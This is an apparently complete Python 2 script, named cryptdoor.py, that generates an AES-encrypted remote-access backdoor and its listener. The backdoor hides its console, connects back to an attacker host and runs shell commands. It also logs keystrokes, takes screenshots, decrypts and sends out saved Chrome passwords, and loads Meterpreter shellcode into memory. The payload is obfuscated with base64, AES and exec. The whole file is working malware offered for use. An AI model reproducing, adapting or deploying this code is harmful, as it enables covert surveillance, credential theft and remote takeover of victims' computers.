#!/usr/bin/python

from Crypto.Cipher import AES
import base64, random, string, sys, re, os

BLOCK_SIZE = 32
PADDING = '{'

def randKey(bytes):
	return ''.join(random.choice(string.ascii_letters + string.digits + "{}!@#$^&()*&[]|,./?") for x in range(bytes))

def randVar():
	return ''.join(random.choice(string.ascii_letters) for x in range(3)) + "_" + ''.join(random.choice("0123456789") for x in range(3))

pad = lambda s: str(s) + (BLOCK_SIZE - len(str(s)) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
key, iv, secretkey = randKey(32), randKey(16), randKey(32)

finput = '''def fscreenshot():
	hwnd = 0
	hwndDC = win32gui.GetWindowDC(hwnd)
	mfcDC = win32ui.CreateDCFromHandle(hwndDC)
	saveDC = mfcDC.CreateCompatibleDC()
	saveBitMap = win32ui.CreateBitmap()
	MoniterDev = win32api.EnumDisplayMonitors(None,None)
	w = MoniterDev[0][2][2]
	h = MoniterDev[0][2][3]
	saveBitMap.CreateCompatibleBitmap(mfcDC, w, h)
	saveDC.SelectObject(saveBitMap)
	saveDC.BitBlt((0,0),(w, h) , mfcDC, (0,0), win32con.SRCCOPY)
	bmpname=win32api.GetTempFileName(".","")[0]+'.bmp'
	saveBitMap.SaveBitmapFile(saveDC, bmpname)
	mfcDC.DeleteDC()
	saveDC.DeleteDC()
	win32gui.ReleaseDC(hwnd, hwndDC)
	win32gui.DeleteObject(saveBitMap.GetHandle())
	return bmpname

def MeterDrop(mhost, mport):
	try:
		global DropSock
		DropSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		DropSock.connect((mhost, int(mport)))
		yWubQo = struct.pack('<i', DropSock.fileno())
		l = struct.unpack('<i', str(DropSock.recv(4)))[0]
		UDDvfkFdFXs = "     "
		while len(UDDvfkFdFXs) < l: UDDvfkFdFXs += DropSock.recv(l)
		HNzdFhkeybuffervICp = ctypes.create_string_buffer(UDDvfkFdFXs, len(UDDvfkFdFXs))
		HNzdFhkeybuffervICp[0] = binascii.unhexlify('BF')
		for i in xrange(4): HNzdFhkeybuffervICp[i+1] = yWubQo[i]
		return HNzdFhkeybuffervICp
	except: return None

def ExecInMem(binary):
	if binary != None:
		iNGRgaQLVJ = bytearray(binary)
		imHlcWqpKVwgodv = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(iNGRgaQLVJ)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
		ctypes.windll.kernel32.VirtualLock(ctypes.c_int(imHlcWqpKVwgodv), ctypes.c_int(len(iNGRgaQLVJ)))
		DWsMxliK = (ctypes.c_char * len(iNGRgaQLVJ)).from_buffer(iNGRgaQLVJ)
		ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(imHlcWqpKVwgodv), DWsMxliK, ctypes.c_int(len(iNGRgaQLVJ)))
		ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(imHlcWqpKVwgodv),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
		ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

def frunthis(cmd):
	os.popen(cmd)

def pressed_chars(event):   
	global keydump
	if event.Ascii:
		char = chr(event.Ascii) 
		if event.Ascii == 13:   
			keydump += "**n"
		elif event.Ascii == 8:
			keydump += "[Backspace]"
		elif event.Ascii== 9:
			keydump += "[Tab]"
		elif event.Ascii== 16:
			keydump += "[Shift]"
		elif event.Ascii== 17:
			keydump += "[Control]"
		elif event.Ascii== 27:
			keydump += "[Escape]"
		elif event.Ascii== 35:
			keydump += "[End]"
		elif event.Ascii== 36:
			keydump += "[Home]"
		elif event.Ascii== 37:
			 keydump += "[Left]"
		elif event.Ascii== 38:
			keydump += "[UP]"
		elif event.Ascii== 39:
			keydump += "[Right]"
		elif event.Ascii== 40:
			keydump += "[Down]"
		else:
			if char in string.printable:
				keydump += char

def klloop():
	try:
		proc = pyHook.HookManager()     
		proc.KeyDown = pressed_chars    
		proc.HookKeyboard()           
		pythoncom.PumpMessages()       
	except:
		return 0

host, port, secret = '***HOST***', ***PORT***, '***SECRET***'

try:
	window = win32console.GetConsoleWindow()
	win32gui.ShowWindow(window,0)
except:
	pass

BLOCK_SIZE, PADDING, keydump = 32, '{', ''
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret,AES.MODE_CFB, iv)
MeterBin, DropSock = None, None
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
success = EncodeAES(cipher, 'EOFEOFEOFEOFEOFYEOFEOFEOFEOFEOFY')
s.send(success)
if os.name == 'nt':
	pwdvar = 'cd'
else:
	pwdvar = 'pwd'
pp = subprocess.Popen(pwdvar, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
pwd = pp.stdout.read().strip() + pp.stderr.read().strip()

while 1:
	data = s.recv(1024)
	decrypted = DecodeAES(cipher, data)
	if decrypted == "quit" or decrypted == "exit":
		break

	elif decrypted.startswith('screenshot'):
		if pwdvar == 'cd':
			upfile = fscreenshot()
			with open(upfile, 'rb') as f:
				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFC" + f.read() + "EOFEOFEOFEOFEOFZ")
			s.send(encrypted)
			os.remove(upfile)
		else:
			encrypted = EncodeAES(cipher, " [X] screenshot is only available for windows!**nEOFEOFEOFEOFEOFX")
			s.send(encrypted)

	elif decrypted.startswith("chromepass"):
		if pwdvar == 'cd':
			sendpass = ''
			appdata = os.getenv("APPDATA")
			try:
				connection = sqlite3.connect(appdata + "%s..%sLocal%sGoogle%sChrome%sUser Data%sDefault%sLogin Data" % (os.sep,os.sep,os.sep,os.sep,os.sep,os.sep,os.sep))
				cursor = connection.cursor()
				cursor.execute('SELECT origin_url, action_url, username_value, password_value FROM logins')
				for information in cursor.fetchall():
					passw = win32crypt.CryptUnprotectData(information[3], None, None, None, 0)[1]
					if passw:
						sendpass += '**n [*] Website-origin: ' + information[0] + '**n [*] Website-action: ' + information[1]
						sendpass += '**n [*] Username: ' + information[2]
						sendpass += '**n [*] Password: ' + passw + '**n'
				if len(sendpass) > 15:
					encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (sendpass))
				else:
					encrypted = EncodeAES(cipher, " [X] No stored passwords found.**nEOFEOFEOFEOFEOFX")
				s.send(encrypted)
			except Exception as e:
				encrypted = EncodeAES(cipher, str(e) + "**nEOFEOFEOFEOFEOFX")
				s.send(encrypted)
		else:
			encrypted = EncodeAES(cipher, " [X] Error: chromepass command is only available on windows.**nEOFEOFEOFEOFEOFX")
			s.send(encrypted)

	elif decrypted.startswith("keydump"):
		encrypted = EncodeAES(cipher, "%s**nEOFEOFEOFEOFEOFX" % (keydump))
		s.send(encrypted)

	elif decrypted.startswith("keyscan"):
		kl = threading.Thread(target = klloop)
		kl.start()
		encrypted = EncodeAES(cipher, " [*] Keylogging started.**nEOFEOFEOFEOFEOFX")
		s.send(encrypted)

	elif decrypted.startswith("keyclear"):
		encrypted = EncodeAES(cipher, "%s**n [*] Keybuffer cleared.**nEOFEOFEOFEOFEOFX" % (keydump))
		s.send(encrypted)
		keydump = ''

	elif decrypted.startswith("meterpreter "):
		try:
			mhost,mport = decrypted.split(' ')[1].split(':')
			MeterBin = MeterDrop(mhost, mport)
			encrypted = EncodeAES(cipher, " [*] Meterpreter reverse_tcp sent to %s:%s**nEOFEOFEOFEOFEOFX" % (mhost, mport))
			s.send(encrypted)
			t = threading.Thread(target = ExecInMem, args = (MeterBin , ))
			t.start()
		except:
			encrypted = EncodeAES(cipher, " [X] Failed to load meterpreter!**n  usage e.g: meterpreter 192.168.1.20 4444**nEOFEOFEOFEOFEOFX")
			s.send(encrypted)

	elif decrypted.startswith("download "):
		downpath = pwd.strip('**r') + os.sep + decrypted.split(' ')[1]
		with open(downpath, 'rb') as f:
			encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + f.read() + "EOFEOFEOFEOFEOFZ")
		s.send(encrypted)

	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
		ufilename = pwd.strip('**r') + os.sep + decrypted[16:32].strip('*')
		f = open(ufilename, 'wb')
		f.write(decrypted[32:])
		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
			data = s.recv(1024)
			decrypted = DecodeAES(cipher, data)
			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
				f.write(decrypted[:-16])
			else:
				f.write(decrypted)
		f.close()
		encrypted = EncodeAES(cipher, " [*] File uploaded to %s**nEOFEOFEOFEOFEOFX" % (ufilename))
		s.send(encrypted)

	elif decrypted.startswith('run '):
		cmd = 'cd ' + pwd + '&&' + ' '.join(decrypted.split(' ')[1:]) 
		t = threading.Thread(target = frunthis, args = (cmd , ))
		t.start()
		encrypted = EncodeAES(cipher, ' [*] Executed "' + ' '.join(decrypted.split(' ')[1:]) + '" in ' + pwd + '**nEOFEOFEOFEOFEOFX')
		s.send(encrypted)

	else:
		cmd = 'cd %s&&%s&&%s' % (pwd, decrypted, pwdvar)
		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		stdout = proc.stdout.read() + proc.stderr.read()
		if 'is not recognized as an internal' not in stdout and ': not found' not in stdout:
			checkpath = ''.join(stdout.split('**n')[-2:]).strip('**n')
			if ' ' not in checkpath:
				pwd = checkpath

		result = '**n'.join(stdout.split('**n')[:-1]) + '**nEOFEOFEOFEOFEOFX'
		encrypted = EncodeAES(cipher, result)
		s.send(encrypted)

s.close()'''
try:
	hostname, portnumber = sys.argv[1], sys.argv[2]
except:
	print '  Usage ./cryptdoor.py host port (backdoorname) (servername)\n'
	exit()

try:
	outputName = sys.argv[3]
except:
	outputName = "backdoor.py"

try:
	serverName = sys.argv[4]
except:
	serverName = "server.py"

readyscript = finput.replace('**n', '\\n').replace('***HOST***', hostname).replace('***PORT***', portnumber).replace('***SECRET***', secretkey).replace('**r', '\\r')
f = open(outputName, 'w')
cipherEnc = AES.new(key)
encrypted = EncodeAES(cipherEnc, readyscript)

b64var = randVar()
aesvar = 'AES'
f.write('''#!/usr/bin/env python
import subprocess,socket,base64,os,struct,socket,binascii,ctypes,threading,string,sqlite3;from Crypto import Random;from Crypto.Cipher import AES;from base64 import b64decode as %s
try:
	import win32api,win32gui,win32file,win32console,win32crypt,pyHook,pythoncom,win32ui,win32con
except:
	pass
''' % (b64var))
f.write("exec(%s(\"%s\"))" % (b64var,base64.b64encode("exec(%s.new(\"%s\").decrypt(%s(\"%s\")).rstrip('{'))\n" %(aesvar,key,b64var,encrypted))))
f.close()

rawserv = '''#!/usr/bin/env python
from Crypto.Cipher import AES
from Crypto import Random
import readline,socket,base64,os,sys,string,random

def completer(text, state):
	options = [i for i in commands if i.startswith(text)]
	if state < len(options):
		return options[state]
	else:
		return None

def fnextcmd():
	global nextcmd, downfile, upfile
	nextcmd = False
	while not nextcmd:
		nextcmd = raw_input("[AES-shell]>")

	if nextcmd.startswith('upload '):
		upfile = nextcmd.split(' ')[1]
		ufilename = upfile.split(os.sep)[-1]
		if len(ufilename) > 16:
			print ' [X] Error, Filename must be shorter than 16 characters**n'
			fnextcmd()
		else:
			try:
				f = open(upfile, 'rb')
				paddedfilename = ufilename + '*' * (16 - len(ufilename))
				encrypted = EncodeAES(cipher, "EOFEOFEOFEOFEOFS" + paddedfilename + f.read() + "EOFEOFEOFEOFEOFZ")
				s.send(encrypted)
			except:
				print ' [X] Error, %s not found!**n' % (upfile)
				fnextcmd()

	elif nextcmd == '?' or nextcmd == 'help':
		print fhelp()
		fnextcmd()

	elif nextcmd.startswith('download '):
		downfile = nextcmd.split(' ')[1].split(os.sep)[-1]
		encrypted = EncodeAES(cipher, nextcmd)
		s.send(encrypted)

	else:
		encrypted = EncodeAES(cipher, nextcmd)
		s.send(encrypted)

def fhelp():
	return '**n AES-shell options:**n  download file       -  Download a file from remote pwd to localhost**n  upload filepath     -  Upload a file to remote pwd**n  run commands        -  Run a command in the background**n**n Windows Only:**n  meterpreter ip:port -  Execute a reverse_tcp meterpreter to ip:port**n  keyscan             -  Start recording keystrokes**n  keydump             -  Dump recorded keystrokes**n  keyclear            -  Clear the keystroke buffer**n  chromepass          -  Retrieve chrome stored passwords.**n  screenshot          -  Take a screenshot**n'

commands = ['download ', 'upload ', 'meterpreter ', 'keyscan', 'keydump', 'keyclear', 'run ', 'chromepass', 'help', 'screenshot']
readline.parse_and_bind("tab: complete")
readline.set_completer(completer)
BLOCK_SIZE = 32
PADDING = '{'
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
secret, listenport = "***SECRET***", ***PORT***
iv = Random.new().read(AES.block_size)
cipher = AES.new(secret,AES.MODE_CFB, iv)
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print ' [>] Listening for connection on %s' % (listenport)
print ' [>] AES secret: %s' % (secret)
c.bind(('0.0.0.0', int(listenport)))
c.listen(1)
s,address = c.accept()
while True:
	data = s.recv(1024)
	decrypted = DecodeAES(cipher, data)
	if decrypted.endswith("EOFEOFEOFEOFEOFX"):
		print decrypted[:-16]
		fnextcmd()

	elif decrypted.startswith("EOFEOFEOFEOFEOFC"):
		downfile = 'screenshot_' + str(random.randint(2,9999)) + '.bmp'
		f = open(downfile, 'wb')
		f.write(decrypted[16:])
		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
			data = s.recv(1024)
			decrypted = DecodeAES(cipher, data)
			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
				f.write(decrypted[:-16])
			else:
				f.write(decrypted)
		f.close()
		print ' [*] Screenshot saved to ' + downfile + '**n'
		fnextcmd()

	elif decrypted.endswith("EOFEOFEOFEOFEOFY"):
		print ' [*] AES-Encrypted connection established with %s:%s' % (address[0], address[1])
		print fhelp()
		fnextcmd()

	elif decrypted.startswith("EOFEOFEOFEOFEOFS"):
		print ' [*] AES-Encrypted file (%s) received!**n' % (downfile)
		f = open(downfile, 'wb')
		f.write(decrypted[16:])
		while not decrypted.endswith("EOFEOFEOFEOFEOFZ"):
			data = s.recv(1024)
			decrypted = DecodeAES(cipher, data)
			if decrypted.endswith("EOFEOFEOFEOFEOFZ"):
				f.write(decrypted[:-16])
			else:
				f.write(decrypted)
		f.close()
		fnextcmd()

	else:
		if decrypted:
			print decrypted

	if nextcmd == 'exit' or nextcmd == 'quit':
		break
'''
se = open(serverName, 'wb')
finalserver = rawserv.replace('**n', '\\n').replace('***SECRET***', secretkey).replace('***PORT***', portnumber)
se.write(finalserver)
se.close()
os.system('chmod +x %s %s' % (outputName, serverName))
print "\n [*] Backdoor written to %s\n [*] Server written to %s" % (outputName, serverName)
